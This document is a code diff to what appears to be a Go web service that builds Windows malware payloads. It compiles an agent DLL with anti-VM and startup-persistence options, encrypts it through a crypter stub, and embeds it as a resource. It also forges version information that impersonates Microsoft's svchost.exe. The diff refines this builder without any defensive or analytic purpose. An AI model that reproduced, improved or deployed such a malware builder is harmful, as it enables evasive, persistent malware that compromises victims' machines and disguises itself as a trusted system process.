@@ -37,13 +37,12 @@ func ensureCoreObject() error {
 	os.MkdirAll("../output", 0755)
 
 	// Compile agent.cpp to object file ONLY (no linking)
-	// We use -c flag with aggressive optimization
 	args := []string{
 		"-c", "templates/agent.cpp",
 		"-o", coreObj,
 		"-m64", "-fPIE", 
 		"-D_WIN32_WINNT=0x0600", "-D_CRT_SECURE_NO_WARNINGS",
-		"-Os", "-s", "-fvisibility=hidden", "-fno-rtti", "-fno-exceptions", // Obfuscation flags
+		"-Os", "-s", // Optimize size & strip symbols
 	}
 
 	cmd := exec.Command("x86_64-w64-mingw32-g++", args...)
@@ -73,14 +72,13 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// 1. Ensure Core Object
 	if err := ensureCoreObject(); err != nil {
 		w.WriteHeader(http.StatusInternalServerError)
 		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
 		return
 	}
 
-	// 2. Prepare Config Source
+	// 1. Prepare Config Source
 	configTemplate, err := ioutil.ReadFile("templates/config.cpp")
 	if err != nil {
 		http.Error(w, "Config template not found", 500)
@@ -95,18 +93,8 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 	code = strings.ReplaceAll(code, "{{FILE_NAME}}", req.FileName)
 	code = strings.ReplaceAll(code, "{{AES_KEY}}", cfg.AesKey)
 	
-	if req.AntiVM {
-		code = strings.ReplaceAll(code, "{{ANTI_VM}}", "1") 
-	} else { 
-		code = strings.ReplaceAll(code, "{{ANTI_VM}}", "0") 
-	}
-	
-	if req.Startup {
-		code = strings.ReplaceAll(code, "{{STARTUP}}", "1")
-	} else { 
-		code = strings.ReplaceAll(code, "{{STARTUP}}", "0") 
-	}
-	
+	if req.AntiVM { code = strings.ReplaceAll(code, "{{ANTI_VM}}", "1") } else { code = strings.ReplaceAll(code, "{{ANTI_VM}}", "0") }
+	if req.Startup { code = strings.ReplaceAll(code, "{{STARTUP}}", "1") } else { code = strings.ReplaceAll(code, "{{STARTUP}}", "0") }
 	installEnv := "APPDATA"
 	if req.InstallPath == "%TEMP%" { installEnv = "TEMP" }
 	code = strings.ReplaceAll(code, "{{INSTALL_ENV}}", installEnv)
@@ -115,8 +103,8 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 	tempConfigObj := "templates/temp_config.o"
 	ioutil.WriteFile(tempConfigSrc, []byte(code), 0644)
 
-	// 3. Compile Config Object (Fast)
-	cmdConf := exec.Command("x86_64-w64-mingw32-g++", "-c", tempConfigSrc, "-o", tempConfigObj, "-m64")
+	// 2. Compile Config Object
+	cmdConf := exec.Command("x86_64-w64-mingw32-g++", "-c", tempConfigSrc, "-o", tempConfigObj, "-m64", "-Os")
 	if out, err := cmdConf.CombinedOutput(); err != nil {
 		w.WriteHeader(500)
 		json.NewEncoder(w).Encode(map[string]string{"error": "Config Build Failed: " + string(out)})
@@ -125,8 +113,8 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 	defer os.Remove(tempConfigSrc)
 	defer os.Remove(tempConfigObj)
 
-	// 4. Link Core + Config -> DLL
-	tempPayload := "../output/payload.bin"
+	// 3. Link Core + Config -> DLL (Payload)
+	tempPayload := "../output/payload.dll"
 	
 	linkArgs := []string{
 		"-o", tempPayload, 
@@ -135,7 +123,7 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 		"-lole32", "-loleaut32", "-luuid", 
 		"-lwinmm", "-lwininet", "-lwinhttp", "-liphlpapi", "-lnetapi32", "-lcrypt32",
 		"-lstrmiids", "-lwbemuuid",
-		"-static", "-s", "-m64", "-shared",
+		"-static", "-s", "-m64", "-shared", "-Wl,--subsystem,windows", // DLL & GUI Subsystem
 	}
 
 	cmdLink := exec.Command("x86_64-w64-mingw32-g++", linkArgs...)
@@ -144,13 +132,13 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(w).Encode(map[string]string{"error": "Linking Failed: " + string(out)})
 		return
 	}
+	defer os.Remove(tempPayload)
 
-	// --- CRYPTER STAGE (Stub) ---
-	
+	// 4. Encrypt Payload
 	payloadBytes, _ := ioutil.ReadFile(tempPayload)
-	os.Remove(tempPayload)
 	encryptedBytes, keyStr := builder.EncryptPayload(payloadBytes)
 	
+	// 5. Prepare Stub & Resource
 	stubTemplate, _ := ioutil.ReadFile("templates/stub.cpp")
 	stubCode := string(stubTemplate)
 	stubCode = strings.ReplaceAll(stubCode, "{{KEY}}", keyStr)
@@ -158,37 +146,42 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 tempStub := "templates/temp_stub.cpp"
 	ioutil.WriteFile(tempStub, []byte(stubCode), 0644)
 
-	// Resource
 	encPayloadFile := "templates/payload.dat"
 	ioutil.WriteFile(encPayloadFile, encryptedBytes, 0644)
-	resTemplate, _ := ioutil.ReadFile("templates/resource.rc")
-	resContent := string(resTemplate) + "\n101 RCDATA \"payload.dat\""
-	tempResFile := "templates/temp_resource.rc"
+	
+	// Create resource script
+	resContent := "#include <windows.h>\n101 RCDATA \"payload.dat\"\n"
+	// Append Version Info (Simple Fake)
+	resContent += "1 VERSIONINFO FILEVERSION 1,0,0,0 PRODUCTVERSION 1,0,0,0 FILEOS 0x40004 FILETYPE 0x1 { BLOCK \"StringFileInfo\" { BLOCK \"040904b0\" { VALUE \"CompanyName\", \"Microsoft Corporation\" VALUE \"FileDescription\", \"Service Host\" VALUE \"InternalName\", \"svchost\" VALUE \"OriginalFilename\", \"svchost.exe\" VALUE \"ProductName\", \"Windows\" VALUE \"ProductVersion\", \"10.0.19041.1\" } } BLOCK \"VarFileInfo\" { VALUE \"Translation\", 0x409, 1200 } }"
+	
+tempResFile := "templates/temp_resource.rc"
 	ioutil.WriteFile(tempResFile, []byte(resContent), 0644)
 
 	resObj := "../output/resource.o"
 	absOut, _ := filepath.Abs(resObj)
 	resCmd := exec.Command("x86_64-w64-mingw32-windres", "-F", "pe-x86-64", "temp_resource.rc", "-o", absOut)
 	resCmd.Dir = "templates"
-	resCmd.Run()
+	if out, err := resCmd.CombinedOutput(); err != nil {
+		w.WriteHeader(500)
+		json.NewEncoder(w).Encode(map[string]string{"error": "Resource Build Failed: " + string(out)})
+		return
+	}
 
 	defer os.Remove(encPayloadFile)
 	defer os.Remove(tempResFile)
+	defer os.Remove(tempStub)
 
-	// Final Stub Link
+	// 6. Final Stub Link
 	finalOutput := "../output/payload.exe"
 	stubArgs := []string{
 		"-o", finalOutput, tempStub, resObj,
-		"-static", "-m64", 
+		"-static", "-m64", "-s", "-Os", // Strip & Optimize
 		"-lws2_32", "-lgdiplus", "-lgdi32", "-luser32", "-lole32", "-loleaut32", "-luuid", "-lwinmm", "-lwininet", "-lwinhttp", "-liphlpapi", "-lnetapi32", "-lstrmiids",
 	}
 	stubCmd := exec.Command("x86_64-w64-mingw32-g++", stubArgs...)
-	stubOut, err := stubCmd.CombinedOutput()
-	os.Remove(tempStub)
-
-	if err != nil {
+	if out, err := stubCmd.CombinedOutput(); err != nil {
 		w.WriteHeader(500)
-		json.NewEncoder(w).Encode(map[string]string{"error": "Stub Build Failed: " + string(stubOut)})
+		json.NewEncoder(w).Encode(map[string]string{"error": "Stub Build Failed: " + string(out)})
 		return
 	}
 
